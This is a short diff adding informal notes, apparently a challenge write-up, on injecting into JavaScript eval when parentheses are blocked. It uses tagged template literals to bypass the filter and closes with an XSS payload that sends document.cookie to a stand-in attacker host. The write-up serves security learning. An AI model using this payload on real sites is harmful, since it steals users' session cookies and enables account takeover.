@@ -1,0 +1,12 @@
+eval in javascript is a known dangerous function which can execute arbitary code 
+abouve calculation
+eval(1+1) 
+2
+eval(1+1+alert())
+1+1 is 2 and then when its add a funciton its execute the function and return the nan
+in this challenge we can see that the () are not allowed to be used 
+so i cheked mdn and i found that in js we can use backticks to execute show fonction 
+like console.log and so on 
+so i tryed 1+1+alert`xss` and its worked 
+so i found also the ${expression} so i used this payload
+1+1+`${document.location="https://atacker/c?c="+document.cookie}`
